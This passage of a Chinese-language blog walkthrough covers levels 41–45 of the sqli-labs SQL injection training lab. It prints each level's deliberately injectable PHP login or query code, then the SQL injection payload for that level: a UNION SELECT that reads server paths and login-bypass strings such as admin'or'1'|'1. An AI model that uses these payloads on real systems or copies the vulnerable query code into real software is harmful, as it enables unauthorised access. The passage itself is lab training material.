class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database: $dbname"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;font size = "5" color= "#00FF00"&gt;'</span>;</span><br><span class="line">            printf(<span class="string">"Your Username is : %s"</span>, $row[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            printf(<span class="string">"Your Password is : %s"</span>, $row[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf("-----------------\n");</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close($con1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-41.jpg"</span> /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>无任何过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://127.0.0.1/sqli-labs-master/Less-41/?id=0%20union%20select%201,@@basedir,@@datadir</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/08/kNKwNQ.png" alt="kNKwNQ.png"></p><p><b>第四十二关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line">&lt;div align=<span class="string">"right"</span>&gt;</span><br><span class="line">&lt;a style=<span class="string">"font-size:.8em;color:#FFFF00"</span> href=<span class="string">'index.php'</span>&gt;&lt;img src=<span class="string">"../images/Home.png"</span> height=<span class="string">'45'</span>; width=<span class="string">'45'</span>&gt;&lt;/br&gt;HOME&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/db-creds.inc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">($host,$dbuser,$dbpass, $dbname)</span></span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* execute multi query */</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">   <span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>($result = @mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line"> <span class="keyword">if</span>($row = @mysqli_fetch_row($result))</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">   &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$login = sqllogin($host,$dbuser,$dbpass, $dbname);</span><br><span class="line"><span class="keyword">if</span> (!$login== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">$_SESSION[<span class="string">"username"</span>] = $login;</span><br><span class="line">setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">header(<span class="string">'Location: logged-in.php'</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;tr&gt;&lt;td colspan=<span class="string">"2"</span> style=<span class="string">"text-align:center;"</span>&gt;&lt;br/&gt;&lt;p style=<span class="string">"color:#FF0000;"</span>&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/slap1.jpg"</span>&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求万能密码登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:admin&apos;or&apos;1&apos;|&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/08/kNMCKP.png" alt="kNMCKP.png"></p><p><b>第四十三关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line">&lt;div align=<span class="string">"right"</span>&gt;</span><br><span class="line">&lt;a style=<span class="string">"font-size:.8em;color:#FFFF00"</span> href=<span class="string">'index.php'</span>&gt;&lt;img src=<span class="string">"../images/Home.png"</span> height=<span class="string">'45'</span>; width=<span class="string">'45'</span>&gt;&lt;/br&gt;HOME&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/db-creds.inc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">($host,$dbuser,$dbpass, $dbname)</span></span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* execute multi query */</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username=('$username') and password=('$password')"</span>;</span><br><span class="line">   <span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>($result = @mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line"> <span class="keyword">if</span>($row = @mysqli_fetch_row($result))</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">   &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$login = sqllogin($host,$dbuser,$dbpass, $dbname);</span><br><span class="line"><span class="keyword">if</span> (!$login== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">$_SESSION[<span class="string">"username"</span>] = $login;</span><br><span class="line">setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">header(<span class="string">'Location: logged-in.php'</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;tr&gt;&lt;td colspan=<span class="string">"2"</span> style=<span class="string">"text-align:center;"</span>&gt;&lt;br/&gt;&lt;p style=<span class="string">"color:#FF0000;"</span>&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/slap1.jpg"</span>&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求万能密码登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:admin&apos;)or(&apos;1&apos;)|(&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/08/kNMJPJ.md.png" alt="kNMJPJ.md.png"></p><p><b>第四十四关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line">&lt;div align=<span class="string">"right"</span>&gt;</span><br><span class="line">&lt;a style=<span class="string">"font-size:.8em;color:#FFFF00"</span> href=<span class="string">'index.php'</span>&gt;&lt;img src=<span class="string">"../images/Home.png"</span> height=<span class="string">'45'</span>; width=<span class="string">'45'</span>&gt;&lt;/br&gt;HOME&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/db-creds.inc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">($host,$dbuser,$dbpass, $dbname)</span></span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* execute multi query */</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">   <span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>($result = @mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line"> <span class="keyword">if</span>($row = @mysqli_fetch_row($result))</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$login = sqllogin($host,$dbuser,$dbpass, $dbname);</span><br><span class="line"><span class="keyword">if</span> (!$login== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">$_SESSION[<span class="string">"username"</span>] = $login;</span><br><span class="line">setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">header(<span class="string">'Location: logged-in.php'</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;tr&gt;&lt;td colspan=<span class="string">"2"</span> style=<span class="string">"text-align:center;"</span>&gt;&lt;br/&gt;&lt;p style=<span class="string">"color:#FF0000;"</span>&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/slap1.jpg"</span>&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:admin&apos;or&apos;1&apos;|&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/08/kNMJPJ.md.png" alt="kNMJPJ.md.png"></p><p><b>第四十五关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 